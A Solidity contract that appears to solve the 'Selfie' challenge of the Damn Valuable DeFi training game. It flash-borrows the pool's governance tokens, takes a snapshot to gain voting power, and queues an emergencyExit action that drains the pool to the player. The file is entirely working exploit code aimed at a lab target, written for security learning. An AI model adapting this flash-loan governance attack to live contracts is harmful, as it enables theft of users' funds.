// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;
import './ISimpleGovernance.sol';
import './SelfiePool.sol';
import '../DamnValuableTokenSnapshot.sol';

import '@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol';

contract AttackSelfiePool {
    ISimpleGovernance immutable simpleGovernance;
    SelfiePool immutable selfiePool;
    DamnValuableTokenSnapshot immutable token;
    uint256 constant AMOUNT = 1_500_000 ether;
    address immutable player;

    constructor(
        ISimpleGovernance _simpleGovernance,
        SelfiePool _selfiePool,
        DamnValuableTokenSnapshot _token
    ) {
        player = msg.sender;
        simpleGovernance = _simpleGovernance;
        selfiePool = _selfiePool;
        token = _token;
    }

    function attack() external {
        selfiePool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            token.getBalanceAtLastSnapshot(address(selfiePool)),
            ''
        );
    }

    function onFlashLoan(
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        require(tx.origin == player);
        require(msg.sender == address(selfiePool));
        token.snapshot();
        bytes memory data = abi.encodeWithSignature(
            'emergencyExit(address)',
            player
        );
        simpleGovernance.queueAction(address(selfiePool), 0, data);
        token.approve(address(selfiePool), AMOUNT);
        return keccak256('ERC3156FlashBorrower.onFlashLoan');
    }
}
